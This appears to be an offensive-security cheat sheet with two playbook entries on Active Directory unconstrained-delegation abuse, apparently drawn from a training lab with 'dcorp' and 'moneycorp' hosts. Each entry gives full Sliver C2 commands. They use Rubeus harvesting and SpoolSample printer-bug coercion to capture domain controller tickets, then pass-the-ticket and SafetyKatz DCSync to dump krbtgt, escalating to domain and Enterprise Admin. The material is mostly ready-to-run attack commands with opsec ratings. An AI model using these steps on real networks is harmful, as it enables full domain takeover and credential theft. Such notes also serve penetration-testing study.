# Unconstrained Delegation Abuse

### Printer Bug (MS-RPRN / SpoolSample) to Capture DC TGT (Sliver) [added: 2026-04]
- **Tags:** #UnconstrainedDelegation #PrinterBug #SpoolSample #MSRPRN #Rubeus #TGTCapture #T1558
- **Trigger:** Compromised machine with unconstrained delegation; DC has Print Spooler running
- **Prereq:** Compromised host with unconstrained delegation flag; Rubeus and SpoolSample tools; DC with Spooler service
- **Yields:** DC machine account TGT for DCSync or further impersonation
- **Opsec:** Med
- **Context:** Compromised machine with unconstrained delegation. Force DC machine account to authenticate back; capture TGT with Rubeus harvest.
- **Payload/Method:**
```
# Step 1: Start Rubeus harvester on unconstrained delegation host session (Sliver)
[server] sliver (dcorp-appsrv_tcp) > execute-assembly -P <PID> -p 'C:\windows\system32\taskhostw.exe' -t 60 '/path/Rubeus.exe' 'harvest /runfor:30 /interval:8 /nowrap /targetuser:DC$'

# Step 2: Trigger MS-RPRN from foothold session simultaneously
[server] sliver (dcorp-std_https) > execute-assembly -P <PID> -p 'C:\windows\system32\taskhostw.exe' -t 20 '/path/SpoolSample.exe' 'target-dc.domain.local unconstrained-host.domain.local'

# Step 3: Import captured DC TGT and DCSync
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>
.\SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt /domain:domain.local" "exit"
```

### Escalation to Enterprise Admin via Unconstrained Delegation (Sliver) [added: 2026-04]
- **Tags:** #UnconstrainedDelegation #EnterpriseAdmin #CrossForest #SpoolSample #DCSync #ForestEscalation #T1558
- **Trigger:** Unconstrained delegation host in child domain; parent domain DC has Spooler running
- **Prereq:** Compromised unconstrained delegation host; SpoolSample tool; parent DC with Spooler service
- **Yields:** Parent forest DC TGT enabling DCSync of parent domain krbtgt (Enterprise Admin)
- **Opsec:** Med
- **Context:** Capture mcorp-dc$ TGT from an unconstrained delegation machine, import and DCSync moneycorp.
- **Payload/Method:**
```
# Same harvest + SpoolSample flow targeting mcorp-dc
[server] sliver (dcorp-appsrv_tcp) > execute-assembly -P <PID> ... Rubeus.exe 'harvest /runfor:30 /interval:8 /targetuser:MCORP-DC$'
[server] sliver (dcorp-std_https) > execute-assembly ... SpoolSample.exe 'mcorp-dc.moneycorp.local dcorp-appsrv.dollarcorp.moneycorp.local'

# Import TGT and DCSync the parent forest
.\Rubeus.exe ptt /ticket:<MCORP-DC$_TICKET>
.\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```
